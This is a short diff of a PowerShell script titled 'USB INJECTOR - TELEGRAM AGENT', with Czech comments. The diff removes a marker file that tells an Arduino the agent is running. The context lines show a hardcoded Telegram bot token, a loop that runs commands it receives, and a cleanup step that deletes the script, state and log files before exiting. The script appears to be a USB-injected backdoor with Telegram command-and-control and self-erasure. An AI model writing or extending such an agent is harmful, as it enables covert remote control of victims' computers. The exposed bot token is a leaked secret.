@@ -2,9 +2,6 @@
 # USB INJECTOR - TELEGRAM AGENT
 # ============================================
 
-# MARKER SOUBOR - signalizuje Arduinu že agent běží
-"RUNNING" | Out-File -FilePath "C:\agent_running.marker" -Force -Encoding UTF8
-
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 $stateFile = "C:\agent_state.txt"
 $logFile = "C:\agent_log.txt"
@@ -155,7 +152,6 @@ while($true) {
                 Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
                 Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
                 Remove-Item $logFile -Force -ErrorAction SilentlyContinue
-                Remove-Item "C:\agent_running.marker" -Force -ErrorAction SilentlyContinue
                 exit
             } else {
                 Write-Log "Vykonavani prikazu: $cmd"
